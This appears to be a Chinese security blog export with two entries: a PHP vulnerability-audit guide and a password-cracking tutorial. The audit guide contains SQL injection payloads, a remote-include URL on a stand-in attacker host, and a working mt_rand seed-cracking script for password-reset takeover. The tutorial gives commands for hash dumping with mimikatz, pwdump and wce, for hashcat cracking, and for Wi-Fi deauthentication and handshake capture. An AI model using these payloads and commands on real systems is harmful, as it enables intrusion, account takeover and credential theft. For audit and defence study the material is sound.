漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：查找数据库操作字符（select,update,insert等等） 变量的编码与解码一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。 这个类型的主要函数有： 1) stripslashes() 这个其实就是一个decode-addslashes() 2) 其他字符串转换函数： 函数 说明 base64_decode 对使用 MIME base64 编码的数据进行解码 base64_encode 使用 MIME base64 对数据进行编码 rawurldecode 对已编码的 URL 字符串进行解码 rawurlencode 按照 RFC 1738 对 URL 进行编码 urldecode 解码已编码的 URL 字符串 urlencode 编码 URL 字符串 另外一个 unserialize/serialize 3) 字符集函数（GKB,UTF7/8…）如iconv()/mb_convert_encoding()等 目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode： 1$sql = "SELECT * FROM article WHERE articleid='".urldecode($_GET[id])."'"; 当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为： 1SELECT * FROM article WHERE articleid=''' 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：查找对应的编码函数 二次攻击详细见附录 [1] 1) 数据库出来的变量没有进行过滤 2) 数据库的转义符号： mysql/oracle转义符号同样是\（我们提交’通过魔术引号变化为\’，当我们update进入数据库时，通过转义变为’） mssql的转义字符为’（所以我们提交’通过魔术引号变化为\’，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义） 从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？ 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 魔术引号带来的新的安全问题首先我们看下魔术引号的处理机制： 1[\--&gt;\\,&apos;--&gt;\&apos;,&quot;--&gt;\&quot;,null--&gt;\0] 这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞： 1)得到原字符（’,\,”,null]） 12345678910$order_sn=substr($_GET['order_sn'], 1);//提交 '//魔术引号处理 \'//substr '$sql = "SELECT order_id, order_status, shipping_status, pay_status, ". " shipping_time, shipping_id, invoice_no, user_id ". " FROM " . $ecs-&gt;table('order_info'). " WHERE order_sn = '$order_sn' LIMIT 1"; 2)得到“\”字符 12345678910$order_sn=substr($_GET['order_sn'], 0,1);//提交 '//魔术引号处理 \'//substr \ $sql = "SELECT order_id, order_status, shipping_status, pay_status, ". " shipping_time, shipping_id, invoice_no, user_id ". " FROM " . $ecs-&gt;table('order_info'). " WHERE order_sn = '$order_sn' and order_tn='".$_GET['order_tn']."'"; 提交内容： 1?order_sn=&apos;&amp;order_tn=%20and%201=1/* 执行的SQL语句为： 123SELECT order_id, order_status, shipping_status, pay_status, shipping_time, shipping_id, invoice_no, user_id FROM order_info WHERE order_sn = '\' and order_tn=' and 1=1/*' 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：查找字符串处理函数如substr或者通读代码 变量key与魔术引号我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？ 12345678&lt;?php//key.php?aaaa'aaa=1&amp;bb'b=2 //print_R($_GET); foreach ($_GET AS $key =&gt; $value) &#123; print $key."\n"; &#125;?&gt; 1)当magic_quotes_gpc = On时，在php5.24下测试显示： 12aaaa\'aaabb\'b 从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下： 1234&lt;?php//key.php?aaaa'aaa[bb']=1 print_R($_GET); ?&gt; 结果显示: 1Array ( [aaaa'aaa] =&gt; Array ( [bb\'] =&gt; 1 ) ) 数组第一维变量的key不受魔术引号的影响。 漏洞审计策略 PHP版本要求：php4和php&lt;5.2.1 系统要求：无 审计策略：通读代码 2)当magic_quotes_gpc = Off时，在php5.24下测试显示： 12aaaa'aaabb'b 对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下： 123456789101112131415161718&lt;?php //keyvul.php?aaa'aa=1'//magic_quotes_gpc = Off if (!get_magic_quotes_gpc())&#123; $_GET = addslashes_array($_GET);&#125;function addslashes_array($value)&#123; return is_array($value) ? array_map('addslashes_array', $value) : addslashes($value);&#125;print_R($_GET);foreach ($_GET AS $key =&gt; $value)&#123; print $key;&#125;?&gt; 以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下： 12345Array( [aaa'aa] =&gt; 1\')aaa'aa 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 代码注射 PHP中可能导致代码注射的函数很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如： 函数 assert() call_user_func() call_user_func_array() create_function() 变量函数 这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码： 12345678&lt;?php//how to exp this code$sort_by=$_GET['sort_by'];$sorter='strnatcasecmp';$databases=array('test','test');$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]); ';usort($databases, create_function('$a, $b', $sort_function)); 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等） 变量函数与双引号对于单引号和双引号的区别，很多程序员深有体会，示例代码： 12echo "$a\n";echo '$a\n'; 我们再看如下代码： 12345678//how to exp this codeif($globals['bbc_email'])&#123;$text = preg_replace( array("/\[email=(.*?)\](.*?)\[\/email\]/ies", "/\[email\](.*?)\[\/email\]/ies"), array('check_email("$1", "$2")', 'check_email("$1", "$1")'), $text); 另外很多的应用程序都把变量用””存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 PHP自身函数漏洞及缺陷 PHP函数的溢出漏洞大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录 [2]）项目么，其中比较有名的要算是unserialize()，代码如下： 1unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data']); 在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。 漏洞审计策略 PHP版本要求：对应fix的版本 系统要求： 审计策略：查找对应函数名 PHP函数的其他漏洞Stefan Esser大牛发现的漏洞：unset()–Zend_Hash_Del_Key_Or_Index Vulnerability​比如phpwind早期的serarch.php里的代码： 123456789unset($uids);......$query=$db-&gt;query("SELECT uid FROM pw_members WHERE username LIKE '$pwuser'");while($member=$db-&gt;fetch_array($query))&#123; $uids .= $member['uid'].',';&#125;$uids ? $uids=substr($uids,0,-1) : $sqlwhere.=' AND 0 ';........$query = $db-&gt;query("SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit"); 漏洞审计策略 PHP版本要求：php4&lt;4.3 php5&lt;5.14 系统要求：无 审计策略：查找unset session_destroy()删除文件漏洞测试PHP版本：5.1.2​这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下： 12345678910111213&lt;?php //val.php session_save_path('./');session_start();if($_GET['del']) &#123; session_unset(); session_destroy();&#125;else&#123; $_SESSION['hei']=1; echo(session_id()); print_r($_SESSION);&#125;?&gt; 当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink(‘sess_/../1.php’)这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。 漏洞审计策略 PHP版本要求：具体不详 系统要求：无 审计策略：查找session_destroy 随机函数1) rand() VS mt_rand() 12345&lt;?php//on windowsprint mt_getrandmax(); //2147483647print getrandmax();// 32767?&gt; 可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。 12345678910&lt;?php$a= md5(rand());for($i=0;$i&lt;=32767;$i++)&#123; if(md5($i) ==$a ) &#123; print $i."--&gt;ok!! || ";exit; &#125;else &#123; print $i." || ";&#125;&#125;?&gt; 当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：查找rand 2) mt_srand()/srand()-weak seeding（by Stefan Esser） 看php手册里的描述： 123456mt_srand(PHP 3 &gt;= 3.0.6, PHP 4, PHP 5)mt_srand -- 播下一个更好的随机数发生器种子说明void mt_srand ( int seed ) 用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。 例子 1. mt_srand() 范例 12345678910&lt;?php// seed with microsecondsfunction make_seed()&#123; list($usec, $sec) = explode(' ', microtime()); return (float) $sec + ((float) $usec * 100000);&#125;mt_srand(make_seed());$randval = mt_rand();?&gt; _注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已自动完成。_ php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种： 1mt_srand ((double) microtime() * 1000000) 但是使用(double)microtime()*1000000类似的代码seed是比较脆弱的： 10&lt;(double) microtime()&lt;1 ---&gt; 0&lt;(double) microtime()* 1000000&lt;1000000 那么很容易暴力破解,测试代码如下： 123456789101112131415161718192021222324&lt;?php///////////////////&gt;php rand.php//828682//828682////////////////ini_set("max_execution_time",0);$time=(double) microtime()* 1000000;print $time."\n";mt_srand ($time);$search_id = mt_rand();$seed = search_seed($search_id);print $seed;function search_seed($rand_num) &#123;$max = 1000000;for($seed=0;$seed&lt;=$max;$seed++)&#123; mt_srand($seed); $key = mt_rand(); if($key==$rand_num) return $seed;&#125;return false;&#125;?&gt; 从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图： 例A seed-A mt_rand-A-1 mt_rand-A-2 mt_rand-A-3 例B seed-B mt_rand-B-1 mt_rand-B-2 mt_rand-B-3 对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt_rand的值了。 对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析： 第一种：’Cross Application Attacks’，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()* 1000000)），phpbb+wordpree组合就存在这样的危险. 第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：The Implementation When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed. 在32位系统上默认的播种的种子为最大值是2^32，这样我们循环最多2^32次就可以破解seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录 [3] ）,测试代码如下： 1234567&lt;?phpmt_srand(4); $a = mt_rand(); mt_srand(5); $b = mt_rand();print $a."\n".$b;?&gt; 通过上面的代码发现$a==$b，所以我们循环的次数为2^32/2=2^31次。我们看如下代码： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php//base on http://www.milw0rm.com/exploits/6421 //test on php 5.2.0define('BUGGY', 1); //上面代码$a==$b时候定义BUGGY=1$key = wp_generate_password(20, false);echo $key."\n";$seed = getseed($key);print $seed."\n"; mt_srand($seed);$pass = wp_generate_password(20, false);echo $pass."\n"; function wp_generate_password($length = 12, $special_chars = true) &#123; $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; if ( $special_chars ) $chars .= '!@#$%^&amp;*()'; $password = ''; for ( $i = 0; $i &lt; $length; $i++ ) $password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); return $password;&#125; function getseed($resetkey) &#123; $max = pow(2,(32-BUGGY)); for($x=0;$x&lt;=$max;$x++) &#123; $seed = BUGGY ? ($x &lt;&lt; 1) + 1 : $x; mt_srand($seed); $testkey = wp_generate_password(20,false); if($testkey==$resetkey) &#123; echo "o\n"; return $seed; &#125; if(!($x % 10000)) echo $x / 10000; &#125; echo "\n"; return false;&#125;?&gt; 运行结果如下： 12345678910111213141516php5&gt;php rand.phpM8pzpjwCrvVt3oobAaOr01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522..............010621106221062310624106251062610627106281062910630106311063210633o70693pjwCrvVt3oobAaOr 当10634次时候我们得到了结果。 当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如： 123456&lt;?phpmt_srand(42);echo mt_rand();//php&lt;=5.20 1387371436//php&gt;5.20 1354439493 ?&gt; 正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，反过来也是一样。 从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。 很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞） 漏洞审计策略 PHP版本要求：php4 php5&lt;5.2.6 系统要求：无 审计策略：查找mt_srand/mt_rand 特殊字符 其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子： 截断其中最有名的数大家都熟悉的null字符截断。 include截断123&lt;?php include $_GET['action'].".php"; ?&gt; 提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=http://www.hacksite.com/evil-code.txt?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下： 1234567891011121314151617181920&lt;?php////////////////////////var5.php代码:////include $_GET['action'].".php"; ////print strlen(realpath("./"))+strlen($_GET['action']); ///////////////////ini_set('max_execution_time', 0);$str='';for($i=0;$i&lt;50000;$i++)&#123; $str=$str."/"; $resp=file_get_contents('http://127.0.0.1/var/var5.php?action=1.txt'.$str); //1.txt里的代码为print 'hi'; if (strpos($resp, 'hi') !== false)&#123; print $i; exit; &#125;&#125;?&gt; 经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和*nix的系统长度不一样，当win下strlen(realpath(“./“))+strlen($_GET[&#39;action&#39;])的长度大于256时被截断，对于*nix的长度是4 * 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]） 数据截断对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。 1) Mysql SQL Column Truncation Vulnerabilities 这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：​ 12345678910111213mysql&gt; insert into truncated_test(`username`,`password`) values("admin","pass");mysql&gt; insert into truncated_test(`username`,`password`) values("admin x", "new_pass");Query OK, 1 row affected, 1 warning (0.01 sec)mysql&gt; select * from truncated_test;+----+------------+----------+| id | username | password |+----+------------+----------+| 1 | admin | pass || 2 | admin | new_pass |+----+------------+----------+2 rows in set (0.00 sec) 2) Mysql charset Truncation vulnerability 这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：​ 123456789101112mysql&gt; insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");Query OK, 1 row affected, 1 warning (0.00 sec)mysql&gt; select * from truncated_test;+----+------------+----------+| id | username | password |+----+------------+----------+| 1 | admin | pass || 2 | admin | new_pass || 3 | admin | new_pass2 |+----+------------+----------+2 rows in set (0.00 sec) 很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码： 12345$result = mysql_query("SELECT * from test_user where user='$user' "); ....if(@mysql_fetch_array($result, MYSQL_NUM)) &#123; die("already exist");&#125; 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：通读代码 文件操作里的特殊字符文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“...\”进行系统转跳等等。​下面还给大家介绍一个非常有意思的问题： 1234567//Is this code vul?if( eregi(".php",$url) )&#123; die("ERR");&#125;$fileurl=str_replace($webdb[www_url],"",$url);.....header('Content-Disposition: attachment; filename='.$filename); 很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb[www_url]为空，那么我们提交“.p$webdb[www_url]hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码： 1234$fileurl=str_replace($webdb[www_url],"",$url);if( eregi(".php",$url) )&#123; die("ERR");&#125; str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码： 1234567&lt;?phpfor($i=0;$i&lt;255;$i++) &#123; $url = '1.ph'.chr($i); $tmp = @file_get_contents($url); if(!empty($tmp)) echo chr($i)."\r\n";&#125; ?&gt; 我们在windows系统运行上面的代码得到如下字符* &lt; &gt; ? P p都可以打开目录下的1.php。 漏洞审计策略 PHP版本要求：无 系统要求：无 审计策略：文读取件操作函数 怎么进一步寻找新的字典上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？ 分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典 通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式 fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来 分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析） 有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题 你有什么要补充的吗？ ：） DEMO DEMO *DEMO – Discuz! Reset User Password 0day Vulnerability 分析 （Exp:[http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）* PHP版本要求:php4 php5&lt;5.2.6 系统要求: 无 审计策略:查找mt_srand/mt_rand 第一步 安装Discuz! 6.1后利用grep查找mt_srand得到： 123456789101112131415161718192021222324heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5./include/global.func.php-694- $GLOBALS['rewritecompatible'] &amp;&amp; $name = rawurlencode($name);./include/global.func.php-695- return '&lt;a href="tag-'.$name.'.html"'.stripslashes($extra).'&gt;';./include/global.func.php-696-&#125;./include/global.func.php-697-./include/global.func.php-698-function random($length, $numeric = 0) &#123;./include/global.func.php:699: PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);./include/global.func.php-700- if($numeric) &#123;./include/global.func.php-701- $hash = sprintf('%0'.$length.'d', mt_rand(0, pow(10, $length) - 1));./include/global.func.php-702- &#125; else &#123;./include/global.func.php-703- $hash = '';./include/global.func.php-704- $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';--./include/discuzcode.func.php-30-./include/discuzcode.func.php-31-if(!isset($_DCACHE['bbcodes']) | !is_array($_DCACHE['bbcodes']) | !is_array($_DCACHE['smilies'])) &#123;./include/discuzcode.func.php-32- @include DISCUZ_ROOT.'./forumdata/cache/cache_bbcodes.php';./include/discuzcode.func.php-33-&#125;./include/discuzcode.func.php-34-./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);./include/discuzcode.func.php-36-./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) &#123;./include/discuzcode.func.php-38- global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;./include/discuzcode.func.php-39- $attach = $postlist[$pid]['attachments'][$aid];./include/discuzcode.func.php-40- if($attach['attachimg']) &#123; 有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里： 1PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000); 判断了版本，如果是PHP_VERSION &gt; ‘4.2.0’使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况： 1) ‘Cross Application Attacks’ 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() * 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件： 1./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000); 这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]） 2) 有的人认为如果没有mt_srand((double)microtime() * 1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用’Cross Application Attacks’，5.2.6&gt;php&gt;4.2.0 php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。 后话本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。 另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。 本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！ 附录[1] (http://bbs.phpchina.com/attachment.php?aid=22294)[2] ([http://www.php-security.org/)[3] (http://bugs.php.net/bug.php?id=40114)]]></content>
  </entry>
  <entry>
    <title><![CDATA[密码破解系列]]></title>
    <url>%2F2017%2F10%2F28%2F%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[前言本文总结了有关Windows密码、Linux密码、网络设备密码、数据库密码、无线网络密码、web应用登陆密码的破解以及在线扫描服务的密码破解。 正文####1.windows密码破解 获取密码（抓取HASH）：pwdump、wce、mimikatz 破解密码：hashcat、LC5、SAMInside.exe、Ophcrack、mimikatz、hashsuite 密码抓取： 环境：windows7 前提：已经获取root权限 工具：mimikatz 操作： 原理是从lsass.exe进程中直接获取密码信息进行破解，而且该破解应该并非穷举方式，而是直接根据算法进行反向计算。 密码提取： 原因：为了进行口令破解，必须首先运行一个工具，将Windows口令从SAM文件中提取出来，做这一步工作的原因在于Windows运行过程中SAM被锁定，不能直接复制或编辑这个文件(即使有管理员权限也不行)。 环境：windows10（提取hash）、Windows7（破解hash） 工具：Pwdump7，wce（Windows Credentials Editor） 操作： 用管理员权限打开Pwdump7，从而获得Windows口令 用管理员权限打开wce，从而获得Windows的NTML HASH 还可以利用wce直接获取Windows的密码（-w参数是通过摘要式认证缓存一个明文的密码）： 密码破解： 环境：Windows10（CPU：i5；GPU：gtx860） 工具：hashcat、hashsuite 操作： 1.使用hashcat进行密码的破解 hashcat参数简介： -m 这个是指定破解的hash的类型，具体的类型可以在–help参数中看到。 默认是0也就是MD5，而NTLM则是1000。 -a 指定破解的模式，默认是字典模式 -o 输出文件，破解成功的密码存放的文件 –remove移除破解成功的hash，当hash是从文本中读取时有用，避免自 己手工移除已经破解的hash –username 忽略用户名，如果你的hash文件中是username:hash这种格式只 需要指定这个参数，就不需要再手工编辑了 -r 指定规则文件，字典根据规则文件做变形，用于破解相似密码当-a指定为3 时，就是暴力破解模式，这个模式下需要自己指定mask和长度。 Hashcat-plus中以?l表示小写字母，?d表示数字，?u表示大写字母，?s表示所有可打印符号，?a代表所有可打印字符，它等于?l?u?d?s加在一起。 2.使用SAMInside.exe进行密码破解 环境：Windows10 1）使用管理员身份运行SAMInside.exe 2）你可以选择使用Pwdump7获取口令之后将其导入SAMInside.exe进行破解；或者使用SAMInside.exe来直接获取本地口令进行破解（本例使用第二种方式，点击三个小人的图标然后选择import local users via scheduler将本地用户的hash导出来）。 3）选择用户加载字典来进行爆破，最终可以看到已经破解了口令 注：由于我之前载入字典破解了本地密码所以在每次导入时均会显示已经破解了密码 3.使用hashsuite可以直接进行windows的NTML HASH的抓取与破解。但是前提依旧是在管理员权限下进行 环境：windows10 1）首先以管理员身份运行hashsuite 2）导入要破解的口令，在这里我们选择导入本地的口令（选择后软件会自动将口令进行提取） 3）之后我们选择使用字典破解的方式对账户Assassin001的口令进行破解 ####2.Linux密码破解 知识概要： ▶ head -n 2 /etc/passwd root;x:0:0:root:/root:/usr/bin/zsh daemon:x;1:1:daemon:/usr/sbin:/usr/sbin/nologin 以”:”分隔，共有七个字段： 1.账号名称；2.密码（Linux早期密码存放地，现在均存在/etc/shadow中）；3.UID（用户标识符）；4.GID；5.用户信息说明列；6.主文件夹；7.shell ▶ head -n 2 /etc/shadow root:$6$XrLBeXo2$iYJYakUC6eBvRl40PnFKlemX7IjI7QkFu7f3qTZjIr.RBy3dp3YT3QWkDYxmKBmmzQO8FUXXbK72lnaz.GeSB0:17304:0:99999:7::: daemon:*:17043:0:99999:7::: 以”:”分隔，共有九个字段： 1.账号名称；2.密码；3.最近更新密码的日期；4.密码不可被更动的天数；5.密码需要重新更改的天数；6.密码需要更改期限前的警告天数；7.密码过期后的账号宽限时间；8.账号失效日期；9.保留 密码抓取： 环境：kali linux 前提：已经获取root权限(可以使用dirtycow.c等0day进行Linux的提权操作) 工具：mimipenguin(Linux下的mimikatz) 操作： 密码破解： 环境：kali linux 前提：已经获取root权限(可以使用dirtycow.c等0day进行Linux的提权操作) 工具：John the ripper 操作： 1.使用unshadow命令创建1个含有用户名和密码详细信息的文件 2.使用John来破解 ####3.网络设备密码破解 环境：windows7 工具：Cain 操作： 破解Cisco中Password 7加密，密文为052C3C5F70420F1A0E 环境：kali linux 工具：John the ripper 操作： 1.将密文整理成cisco: $1$sqzM$q8vBgOd3KunqZw/D1Nq211，保存在文件中然后使用john进行破解 ####4.数据库密码破解 环境：windows10 MSSQL数据库 工具：Cain 操作： 1.添加Hash到队列 2.开始暴力破解 环境：windows10 MYSQL数据库 工具：Cain 操作： 1.执行SELECT password,USER() FROM mysql.user;来获取密文 2.将MYSQL的密文导入Cain 3.使用字典攻击模式进行攻击 环境：windows10 Oracle数据库 工具：Cain 操作： 1.导入Oracle数据库账号密码 2.进行暴力破解 ####5.无线密码破解 环境：kali linux 、WPA/WPA2 PSK加密 无线路由器 TP-LINK_4D16、Windows10（hashcat进行GPU运算） 工具：外置USB无线网卡 操作： 把网卡切换为监听模式 1sudo airmon-ng start wlan0 2.监听网络流量信息 1sudo airodump-ng -w file wlan0mon 使用mdk3， 强制断线路由的所有链接， 此次操作是为了能让aircrack抓到wifi的握手信息 ， -c为需要强制断线的信道： 1mdk3 wlan0mon d -c 11 过了几分钟， 可以看到， 用户重新连接上了901路由， 我们也捕获到了handshake信息， 上面airodump-ng的命令窗口顶部出现了以下信息 WPA handshake ，此时直接ctrl＋c ，停止捕获信息 在kali的Home目录下生成了了几个文件 ，此时的file-01.cap为最重要的文件： 4.把文件转换为hccapx格式， 我们打开这个网站：https://hashcat.net/cap2hccapx/ ， 然后选择cap文件并点击covert按钮， 并下载一个hccapx格式的文件 5.网页会返回一个hccapx的文件， 使用hashcat命令破解， 参数dict.txt为生成的字典文件 ， -m参数2500代表破解的方式为WPA/WPA2， 999.hccapx为生成的文件， 最后破解出来的密码为whitehat： PS E:\MYSEC\hashcat-3.6.0&gt; .\hashcat64.exe -m 2500 999.hccapx dict.txt ####6.web应用破解 环境：Windows10（phpstudy搭建漏洞靶场DVWA的爆破模块） 工具：burpsuite 操作： 1.使用burpsuite抓取登录时候的数据包 2.将数据包发送至Intruder模块并对攻击点进行标注 3.载入攻击字典并进行暴力破解 4.暴力破解后效果 5.验证破解密码是否正确（一般观察Length和Status来判断正确的密码） 6.如果密码不正确的页面截图 环境：Windows7 工具：AWVS 10.5版本 操作： 1.设置浏览器代理访问登录界面使用burpsuite抓取登录请求包 2.在AWVS扫描器中的HTTP Fuzzer模块填入刚抓的登录过程的HTTP数据包 3.在Generator中可以看到很多方式,可以使用AWVS自带的生成器,也可以选择File Generator来使用自己生成的字典.还可以设定是否编码.最后在需要穷举的地方指定变量,对应的是你Generator的name属性.图中的蓝色字体部分. 